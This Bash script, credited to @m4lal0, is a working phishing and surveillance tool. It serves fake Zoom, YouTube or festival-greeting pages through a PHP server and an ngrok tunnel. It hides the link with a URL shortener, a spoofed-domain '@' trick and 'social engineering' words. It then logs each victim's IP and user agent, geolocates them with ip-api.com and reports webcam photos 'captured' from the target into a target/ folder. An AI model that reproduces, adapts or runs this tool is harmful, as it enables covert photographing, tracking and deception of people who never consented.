#!/bin/bash

#By @m4lal0

# Regular Colors
Black='\033[0;30m'      # Black
Red='\033[0;31m'        # Red
Green='\033[0;32m'      # Green
Yellow='\033[0;33m'     # Yellow
Blue='\033[0;34m'       # Blue
Purple='\033[0;35m'     # Purple
Cyan='\033[0;36m'       # Cyan
White='\033[0;97m'      # White
Blink='\033[5m'         # Blink
Color_Off='\033[0m'     # Text Reset

# Light
LRed='\033[0;91m'       # Ligth Red
LGreen='\033[0;92m'     # Ligth Green
LYellow='\033[0;93m'    # Ligth Yellow
LBlue='\033[0;94m'      # Ligth Blue
LPurple='\033[0;95m'    # Light Purple
LCyan='\033[0;96m'      # Ligth Cyan
LWhite='\033[0;90m'     # Ligth White

# Dark
DGray='\033[2;37m'      # Dark Gray
DRed='\033[2;91m'       # Dark Red
DGreen='\033[2;92m'     # Dark Green
DYellow='\033[2;93m'    # Dark Yellow
DBlue='\033[2;94m'      # Dark Blue
DPurple='\033[2;95m'    # Dark Purple
DCyan='\033[2;96m'      # Dark Cyan
DWhite='\033[2;90m'     # Dark White

# Bold
BBlack='\033[1;30m'     # Bold Black
BRed='\033[1;31m'       # Bold Red
BGreen='\033[1;32m'     # Bold Green
BYellow='\033[1;33m'    # Bold Yellow
BBlue='\033[1;34m'      # Bold Blue
BPurple='\033[1;35m'    # Bold Purple
BCyan='\033[1;36m'      # Bold Cyan
BWhite='\033[1;37m'     # Bold White

# Italics
IBlack='\033[3;30m'     # Italic Black
IGray='\033[3;90m'      # Italic Gray
IRed='\033[3;31m'       # Italic Red
IGreen='\033[3;32m'     # Italic Green
IYellow='\033[3;33m'    # Italic Yellow
IBlue='\033[3;34m'      # Italic Blue
IPurple='\033[3;35m'    # Italic Purple
ICyan='\033[3;36m'      # Italic Cyan
IWhite='\033[3;37m'     # Italic White

# Underline
UBlack='\033[4;30m'     # Underline Black
URed='\033[4;31m'       # Underline Red
UGreen='\033[4;32m'     # Underline Green
UYellow='\033[4;33m'    # Underline Yellow
UBlue='\033[4;34m'      # Underline Blue
UPurple='\033[4;35m'    # Underline Purple
UCyan='\033[4;36m'      # Underline Cyan
UWhite='\033[4;37m'     # Underline White

# Background
On_Black='\033[40m'     # Background Black
On_Red='\033[41m'       # Background Red
On_Green='\033[42m'     # Background Green
On_Yellow='\033[43m'    # Background Yellow
On_Blue='\033[44m'      # Background Blue
On_Purple='\033[45m'    # Background Purple
On_Cyan='\033[46m'      # Background Cyan
On_White='\033[47m'     # Background White

trap ctrl_c INT

function stopServices() {
    CHECKNGROK=$(ps aux | grep -o "ngrok" | head -n1)
    CHECKPHP=$(ps aux | grep -o "php" | head -n1)
    if [[ $CHECKNGROK == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi
    if [[ $CHECKPHP == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
}

function ctrl_c(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}Saliendo...${Color_Off}\n"
    stopServices
    rm -rf index.php index2.html &>/dev/null
    tput cnorm; exit 0
}

function banner(){
    echo -e "${BRed} ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄ ${BBlue} ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ${Color_Off}"
    echo -e "${BRed}█       █       █  █▄█  █${BBlue}█       █  █ █  █       █       █       █${Color_Off}"
    echo -e "${BRed}█       █   ▄   █       █${BBlue}█  ▄▄▄▄▄█  █▄█  █   ▄   █▄     ▄█  ▄▄▄▄▄█${Color_Off}"
    echo -e "${BRed}█     ▄▄█  █▄█  █       █${BBlue}█ █▄▄▄▄▄█       █  █ █  █ █   █ █ █▄▄▄▄▄ ${Color_Off}"
    echo -e "${BRed}█    █  █       █       █${BBlue}█▄▄▄▄▄  █   ▄   █  █▄█  █ █   █ █▄▄▄▄▄  █${Color_Off}"
    echo -e "${BRed}█    █▄▄█   ▄   █ ██▄██ █${BBlue} ▄▄▄▄▄█ █  █ █  █       █ █   █  ▄▄▄▄▄█ █${Color_Off}"
    echo -e "${BRed}█▄▄▄▄▄▄▄█▄▄█ █▄▄█▄█   █▄█${BBlue}█▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄█${Color_Off}"
    echo -e "\t\t\t\t\t${IWhite}  .::.   By @m4lal0   .::.${Color_Off}\n\n"
}

function dependencies(){
    tput civis; clear; banner
    if [ "$EUID" -ne 0 ]; then
        echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}Este script debe ser ejecutado por r00t!${Color_Off}\n"
        tput cnorm; exit 1
    fi
    dependencies=(php unzip curl wget)
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Comprobando herramientas necesarias...${Color_Off}\n"
    for program in "${dependencies[@]}"; do
        echo -ne "${LBlue}[${BBlue}*${LBlue}] ${BWhite}Herramienta $program...${Color_Off}"
        command -v $program > /dev/null 2>&1
        if [ "$(echo $?)" == "0" ]; then
            echo -e "${LBlue}($BGreen✔${LBlue})${Color_Off}"
        else
            echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
            echo -e "${LBlue}[${BYellow}!${LBlue}] ${BYellow}Instalando ${IYellow}$program...${Color_Off}"
            apt-get install $program -y > /dev/null 2>&1
        fi; sleep 1
    done
    if [[ ! -e ngrok ]]; then
        echo -ne "${LCyan}[${BYellow}!${LCyan}] ${BYellow}Instalando ${IYellow}ngrok...${Color_Off}"
        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
        if [[ -e ngrok-stable-linux-386.zip ]]; then
            unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-stable-linux-386.zip
            echo -e "${LCyan}(${BGreen}✔${LCyan})${Color_Off}"
        else
            echo -e "${LCyan}(${Bred}✘${LCyan})${Color_Off}"
            echo -e "${IRed}Error al instalar Ngrok...${Color_off}\n"
            exit 1
        fi
    else
        echo -e "${LBlue}[${BBlue}*${LBlue}] ${BWhite}Herramienta ngrok...${LBlue}($BGreen✔${LBlue})${Color_Off}"
    fi
    if [[ ! -d target ]]; then
        mkdir target
    fi
    if [[ -e ip.txt ]]; then
        rm -rf ip.txt
    fi
    if [[ -e iptracker.log ]]; then
        rm -rf iptracker.log
    fi
    if [[ ! -e templates/youtube.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Youtube${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    if [[ ! -e templates/festivalwishes.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Festival Wishes${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    if [[ ! -e templates/zoom.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Zoom${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    sleep 3
}

function urlChecker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "${LBlue}[${BRed}✘${LBlue}] ${BRed}Error en la URL, utilice https ó http${Color_Off}"
            sleep 5
            config
        fi
    fi
}

function startServices(){
    banner; tput civis
    TEMPLATE=$1
    URL=$2
    echo -e "\n${LBlue}[${BBlue}+${LBlue}] ${BBlue}URL a proporcionar: ${UWhite}$URL${Color_Off}"

    sed 's+forwarding_link+'$URL'+g' templates/template.php > index.php
    if [[ $TEMPLATE -eq 1 ]]; then
        sed 's+forwarding_link+'$URL'+g' templates/zoom.html > index2.html
    fi
    if [[ $TEMPLATE -eq 2 ]]; then
        sed 's+forwarding_link+'$URL'+g' templates/youtube.html > index3.html
        sed 's+live_yt_tv+'$YOUTUBEID'+g' index3.html > index2.html
        rm -rf index3.html
    fi
    if [[ $TEMPLATE -eq 3 ]]; then
        sed 's+forwarding_link+'$URL'+g' templates/festivalwishes.html > index3.html
        sed 's+fes_name+'$FESTILVALNAME'+g' index3.html > index2.html
        rm -rf index3.html
    fi
}

function config(){
    clear; banner
    echo -e "${Cyan}╔────────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}│  [${BBlue}++${LBlue}]${BCyan}  Configurar plantilla web  ${LBlue}[${BBlue}++${LBlue}]  │${Color_Off}"
    echo -e "${Cyan}┖────────────────────────────────────────┙${Color_Off}\n"
    DEFAULT_OPTION_TEMPLATE="1"
    DEFAULT_OPTION_MASK="n"
    echo -e "${LRed}[${LGreen}1${LRed}] ${Yellow}Zoom${Color_Off}"
    echo -e "${LRed}[${LGreen}2${LRed}] ${Yellow}Youtube${Color_Off}"
    echo -e "${LRed}[${LGreen}3${LRed}] ${Yellow}Festival Wishes${Color_Off}"
    tput cnorm
    echo -e "\n${BRed}┌─[${BWhite}Elegir plantilla (1/2/3) - ${IWhite}Default es 1${Color_Off}${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read OPTION_TEMPLATE
    echo -e "${Color_Off}"
    OPTION_TEMPLATE="${OPTION_TEMPLATE:-${DEFAULT_OPTION_TEMPLATE}}"
    if [[ $OPTION_TEMPLATE -eq 2 ]]; then
        YOUTUBEID=""
        while [ "$YOUTUBEID" == "" ]; do
            echo -e "${BRed}┌─[${BWhite}ID del video de Youtube${BRed}]${Color_Off}"
            echo -en "${BRed}└──╼${BGreen} " && read YOUTUBEID
            echo -e "${Color_Off}"
        done
    fi
    if [[ $OPTION_TEMPLATE -eq 3 ]]; then
        FESTILVALNAME=""
        while [ "$FESTILVALNAME" == "" ]; do
            echo -e "${BRed}┌─[${BWhite}Nombre del Festival${BRed}]${Color_Off}"
            echo -en "${BRed}└──╼${BGreen} " && read FESTILVALNAME
            echo -e "${Color_Off}"
        done
    fi

    echo -e "${Cyan}╔──────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}│    [${BBlue}++${LBlue}]${BCyan}  Ejecutar servicios  ${LBlue}[${BBlue}++${LBlue}]    │${Color_Off}"
    echo -e "${Cyan}┖──────────────────────────────────────┙${Color_Off}\n"
    echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Iniciando servidor PHP...${Color_Off}"
    php -S 127.0.0.1:3333 &>/dev/null &
    if [ $? -eq 0 ]; then
        sleep 3
        echo -e "${LBlue}(${BGreen}✔${LBlue})${Color_Off}"
    else
        sleep 3
        echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
        exit 1
    fi
    echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Iniciando servidor Ngrok...${Color_Off}"
    ./ngrok http 3333 &>/dev/null &
    if [ $? -eq 0 ]; then
        sleep 3
        echo -e "${LBlue}(${BGreen}✔${LBlue})${Color_Off}"
    else
        sleep 3
        echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
        exit 1
    fi

    URL=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

    echo -e "\n${Cyan}╔────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}│     [${BBlue}++${LBlue}]${BCyan}  Configurar URL  ${LBlue}[${BBlue}++${LBlue}]     │${Color_Off}"
    echo -e "${Cyan}┖────────────────────────────────────┙${Color_Off}\n"
    echo -e "${BRed}┌─[${BWhite}Quiere enmascarar la URL? ${BWhite}(${LGreen}y${BWhite}/${LRed}N${BWhite})${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read OPTION_MASK
    echo -e "${Color_Off}"
    OPTION_MASK="${OPTION_MASK:-${DEFAULT_OPTION_MASK}}"
    if [[ $OPTION_MASK == "y" || $OPTION_MASK == "Y" ]]; then
        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
        SHORTER=${SHORT#https://}
        echo -e "${BRed}┌─[${BWhite}Colocar URL de suplantación de identidad con http o https${BRed}]${Color_Off}"
        echo -en "${BRed}└──╼${BGreen} " && read MASK
        echo -e "${Color_Off}"
        urlChecker $MASK
        echo -e "${BRed}┌─[${BWhite}Escriba palabras de ingeniería social (como mi-estado-de-cuenta, mi-foto), no use el espacio, solo use '-' entre las palabras de ingeniería social${BRed}]${Color_Off}"
        echo -en "${BRed}└──╼${BGreen} " && read WORDS
        echo -e "${Color_Off}"
        URLMASK=$MASK-$WORDS@$SHORTER
        clear
        startServices $OPTION_TEMPLATE $URLMASK
    elif [[ ! $OPTION_MASK == "y" || ! $OPTION_MASK == "Y" ]]; then
        clear
        startServices $OPTION_TEMPLATE $URL
    fi
}

function getIP(){
    IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    UA=$(grep 'User-Agent:' ip.txt | cut -d '"' -f2)
	IFS=$'\n'
    echo -e "\t${BBlue}IP del objetivo: ${BWhite}$IP${Color_Off}"
    echo -e "\t${BBlue}User-Agent: ${BWhite}$UA${Color_Off}"

    curl -s "http://ip-api.com/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log 2>/dev/null
    STATUS=$(cat iptracker.log | grep -Po '(?<="status":)[^},]*' | tr -d '"')
    if [[ $STATUS == "success" ]]; then
        COUNTRY=$(cat iptracker.log  | grep -Po '(?<="country":)[^},]*' | tr -d '"')
        CITY=$(cat iptracker.log  | grep -Po '(?<="city":)[^},]*' | tr -d '"')
        REGION=$(cat iptracker.log  | grep -Po '(?<="regionName":)[^},]*' | tr -d '"')
        LAT=$(cat iptracker.log  | grep -Po '(?<="lat":)[^},]*' | tr -d '"')
        LON=$(cat iptracker.log  | grep -Po '(?<="lon":)[^},]*' | tr -d '"')
        ISP=$(cat iptracker.log  | grep -Po '(?<="isp":)[^},]*' | tr -d '"')
    fi
    if [[ ! -z $COUNTRY ]]; then
        echo -e "\t${BBlue}Pais: ${BWhite}$COUNTRY${Color_Off}"
    fi
    if [[ ! -z $CITY ]]; then
        echo -e "\t${BBlue}Ciudad: ${BWhite}$CITY${Color_Off}"
    fi
    if [[ ! -z $REGION ]]; then
        echo -e "\t${BBlue}Región: ${BWhite}$REGION${Color_Off}"
    fi
    if [[ ! -z $ISP ]]; then
        echo -e "\t${BBlue}ISP: ${BWhite}$ISP${Color_Off}"
    fi
    if [[ ! -z $LAT ]]; then
        echo -e "\t${BBlue}Latitud: ${BWhite}$LAT${Color_Off}"
    fi
    if [[ ! -z $LON ]]; then
        echo -e "\t${BBlue}Longitud: ${BWhite}$LON${Color_Off}"
    fi
    echo -e "\t${BBlue}Evidencia guardada en: ${IWhite}target/$IP.txt${Color_Off}\n"
    cat iptracker.log >> target/$IP.txt
    rm -rf iptracker.log
}

function start(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Espere a que el objetivo entre a la URL, presione ${Color_Off}${Blink}Ctrl + C${Color_Off} ${BYellow}para salir...${Color_Off}\n"
    while [ true ]; do
		if [[ -e "ip.txt" ]]; then
            echo -e "\n${BGreen}[+] El objetivo entró a la URL! ${Color_Off}\n"
            getIP
            rm -rf ip.txt
		fi
	    sleep 0.5
        if [[ -e "Log.log" ]]; then
            echo -e "\t${BGreen}[+] Foto capturada: ${LGray}guardado en target/${Color_Off}"
            rm -rf Log.log
        fi
        sleep 0.5
	done
}

function main(){
    dependencies
    config
    start
}

main